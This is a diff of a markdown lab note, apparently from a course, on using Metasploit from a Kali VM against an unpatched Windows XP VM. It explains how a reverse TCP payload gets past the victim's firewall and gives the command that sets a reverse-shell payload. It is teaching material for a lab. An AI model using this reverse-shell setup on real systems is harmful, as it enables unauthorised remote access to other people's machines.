@@ -68,4 +68,11 @@ exploit
 
 ## Using Reverse TCP Payload
 > In the previous exploit, Kali creates a connection to the unpatched WinXP, but if the firewall on WinXP is enabled, Kali is unable to connect to WinXP
-> To address this problem, the payload `reverse_tcp` tells the victim to connect to the attacker (Kali VM) as Win
+> To address this problem, the payload `reverse_tcp` tells the victim to connect to the attacker (Kali VM) as WinXP as WinXP is the one initiating the connection, hence the firewall will allow it
+
+**On Kali VM**
+1. Set the payload to `reverse_tcp`
+```
+set payload windows/shell/reverse_tcp
+```
+2. Type`show options` to see the options set
